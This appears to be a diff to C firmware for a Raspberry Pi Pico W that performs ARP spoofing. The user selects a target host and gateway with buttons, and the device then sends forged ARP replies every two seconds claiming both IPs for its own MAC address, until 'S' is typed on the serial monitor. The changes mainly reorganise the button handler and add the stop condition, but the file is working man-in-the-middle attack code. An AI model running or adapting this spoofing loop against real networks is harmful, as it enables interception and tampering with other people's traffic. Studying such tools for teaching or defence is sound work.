@@ -1,4 +1,4 @@
-// TH
+//TH 
 #include <stdio.h>
 #include "pico/cyw43_arch.h"
 #include "pico/stdlib.h"
@@ -11,6 +11,10 @@
 #include "lwip/ethip6.h"
 #include "lwip/etharp.h"
 #include "lwip/raw.h"
+#include "lwip/ip.h"
+#include "lwip/pbuf.h"
+#include "lwip/udp.h"
+#include "lwip/tcp.h"
 
 // Define the Ethernet ethertype for ARP
 #define ARP_PROTOCOL 0x0806
@@ -42,6 +46,20 @@ struct EntryInfo {
 struct EntryInfo targetEntryInfo;
 struct EntryInfo targetGatewayInfo;
 
+// Callback function when a button is pressed
+static void button_isr(uint gpio, uint32_t events)
+{
+    // For some reason having 2 ISR didn't work, so sticking to one
+    if (gpio == BUTTON_UP_PIN)
+    {
+        selectedEntry++;
+    }
+    else if (gpio == BUTTON_DOWN_PIN)
+    {
+        selectedEntry--;
+    }
+}
+
 void connectWIFI()
 {
     if (cyw43_arch_init()) 
@@ -60,19 +78,6 @@ void connectWIFI()
     }
 
     printf("Connected.\n");
-}
-// Callback function when a button is pressed
-static void button_isr(uint gpio, uint32_t events)
-{
-    // For some reason having 2 ISR didn't work, so sticking to one
-    if (gpio == BUTTON_UP_PIN)
-    {
-        selectedEntry++;
-    }
-    else if (gpio == BUTTON_DOWN_PIN)
-    {
-        selectedEntry--;
-    }
 }
 
 // Function to select an entry
@@ -237,7 +242,6 @@ void main_task(__unused void *params)
     // Configure the GPIO pins for interrupt generation on the falling edge
     gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);   
     gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);
-    gpio_set_irq_enabled_with_callback(BUTTON_SELECT_PIN, GPIO_IRQ_EDGE_FALL, true, &button_isr);      
 
     printf("\nSelect the Target: Press 'Up'(20) and 'Down'(21) buttons to select an entry. Press 'Select'(22) to confirm.\n");
     targetEntry = selectEntry(netif, arpEntries, targetEntry);
@@ -280,9 +284,8 @@ void main_task(__unused void *params)
 
     gpio_set_irq_enabled_with_callback(BUTTON_UP_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);   
     gpio_set_irq_enabled_with_callback(BUTTON_DOWN_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);
-    gpio_set_irq_enabled_with_callback(BUTTON_SELECT_PIN, GPIO_IRQ_EDGE_FALL, false, &button_isr);
 
-    while(1)
+    while(getchar_timeout_us(0) != 'S')
     {
         if (etharp_get_entry(targetEntry, &ipaddr, &netif, &ethaddr)) 
         {
@@ -294,12 +297,12 @@ void main_task(__unused void *params)
 
         if (etharp_get_entry(targetGateway, &ipaddr, &netif, &ethaddr)) 
         {
-            printf("Sending ARP to Gateway: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            printf("Sending ARP to Gateway: %d, IP Address: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n\n",
                 targetGateway, ip4addr_ntoa(ipaddr), ethaddr->addr[0], ethaddr->addr[1],
                 ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
             send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, &targetEntryInfo.ipaddr, &device_mac, &ip);
         }
-        printf("\n");
+        printf("Enter 'S' into the serial monitor to stop spoofing.\n");
         sleep_ms(2000);
     }
     cyw43_arch_deinit();
